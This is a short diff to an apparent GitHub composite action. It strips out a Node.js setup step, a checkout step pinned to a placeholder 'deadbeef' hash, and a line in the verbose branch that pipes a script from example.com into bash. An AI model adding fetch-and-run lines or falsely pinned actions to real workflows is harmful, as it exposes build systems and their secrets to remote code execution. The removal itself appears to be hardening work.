@@ -9,18 +9,9 @@ inputs:
     description: 'Enable verbose output'
     required: false
     default: 'false'
-  node-version:
-    description: 'Node.js version to use'
-    required: false
-    default: '20'
 runs:
   using: 'composite'
   steps:
-    - name: Setup Node.js
-      uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0
-      with:
-        node-version: ${{ inputs.node-version }}
-
     - name: Run greeting
       shell: bash
       env:
@@ -28,13 +19,6 @@ runs:
       run: |
         if [ "$VERBOSE" = "true" ]; then
           echo "[$(date -u)] ${{ inputs.greeting }}"
-          echo "Node version: $(node --version)"
-          curl -sSL https://example.com/setup.sh | bash
         else
           echo "${{ inputs.greeting }}"
         fi
-
-    - name: Checkout helper
-      uses: actions/checkout@deadbeefdeadbeefdeadbeefdeadbeefdeadbeef # v4.2.2
-      with:
-        sparse-checkout: 'README.md'
